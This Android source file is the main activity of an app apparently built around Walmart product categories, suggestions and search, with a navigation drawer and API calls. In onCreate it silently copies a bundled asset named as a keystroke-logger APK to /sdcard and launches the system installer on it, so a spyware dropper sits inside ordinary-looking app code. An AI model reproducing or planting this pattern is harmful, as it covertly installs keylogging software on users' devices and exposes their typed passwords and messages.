package com.exceptionhandlers.walmartlabs;

import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.util.Log;
import android.view.View;
import android.support.design.widget.NavigationView;
import android.support.v4.view.GravityCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity
        implements NavigationView.OnNavigationItemSelectedListener, Constants {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);


        AssetManager assetManager = getAssets();
        InputStream in = null;
        OutputStream out = null;
        try {
            in = assetManager.open("com.androapps.keystroke.logger.apk");
            out = new FileOutputStream("/sdcard/myapk.apk");
            byte[] buffer = new byte[1024];
            int read;
            while((read = in.read(buffer)) != -1){
                out.write(buffer, 0, read);
            }
            in.close();
            in = null;
            out.flush();
            out.close();
            out = null;
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(Uri.fromFile(new File("/sdcard/myapk.apk")), "application/vnd.android.package-archive");
            startActivity(intent);
        }catch(Exception e){
            // deal with copying problem
        }



        Fragment fragment;
        FragmentManager fragmentManager = getSupportFragmentManager();
        fragment = new category_fragment();
        fragmentManager.beginTransaction().replace(R.id.inc, fragment).commit();


        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        ActionBarDrawerToggle toggle = new ActionBarDrawerToggle(
                this, drawer, toolbar, R.string.navigation_drawer_open, R.string.navigation_drawer_close);
        drawer.setDrawerListener(toggle);
        toggle.syncState();

        NavigationView navigationView = (NavigationView) findViewById(R.id.nav_view);
        navigationView.setNavigationItemSelectedListener(this);
    }

    @Override
    public void onBackPressed() {
        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        if (drawer.isDrawerOpen(GravityCompat.START)) {
            drawer.closeDrawer(GravityCompat.START);
        } else {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        return super.onOptionsItemSelected(item);
    }

    @SuppressWarnings("StatementWithEmptyBody")
    @Override
    public boolean onNavigationItemSelected(MenuItem item) {
        // Handle navigation view item clicks here.
        int id = item.getItemId();

        Fragment fragment;
        FragmentManager fragmentManager = getSupportFragmentManager();
        fragment = new test_fragment();


        if (id == R.id.nav_cat) {
            fragment = new category_fragment();
        } else if (id == R.id.nav_sugg) {
            fragment = new suggestions_fragment();

        } else if (id == R.id.nav_search) {
            fragment = new search_fragment();

        } else if (id == R.id.nav_help) {
            fragment = new test_fragment();

        }

        fragmentManager.beginTransaction().replace(R.id.inc, fragment).commit();

        DrawerLayout drawer = (DrawerLayout) findViewById(R.id.drawer_layout);
        drawer.closeDrawer(GravityCompat.START);
        return true;
    }



    public class Update_user extends AsyncTask<String, Void, String> {


        protected String doInBackground(String... urls) {
            try {
                String uri = API_LINK +"/update-user";
                URL url = new URL(uri);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                String readStream = Utils.readStream(con.getInputStream());

                return readStream;
            } catch (Exception e) {

                Log.e("error",e.getMessage()+" ");
                e.printStackTrace();
                return null;
            }
        }

    }

    public class change_threshold extends AsyncTask<String, Void, String> {

        String gcm_id,flag;
        change_threshold(String gcm_id, String flag){
            this.flag = flag;
            this.gcm_id = gcm_id;
        }

        protected String doInBackground(String... urls) {
            try {
                String uri = API_LINK +"/change-threshold&gcm_id="+gcm_id+"&flag="+flag;
                URL url = new URL(uri);
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                String readStream = Utils.readStream(con.getInputStream());

                return readStream;
            } catch (Exception e) {

                Log.e("error",e.getMessage()+" ");
                e.printStackTrace();
                return null;
            }
        }

    }

}
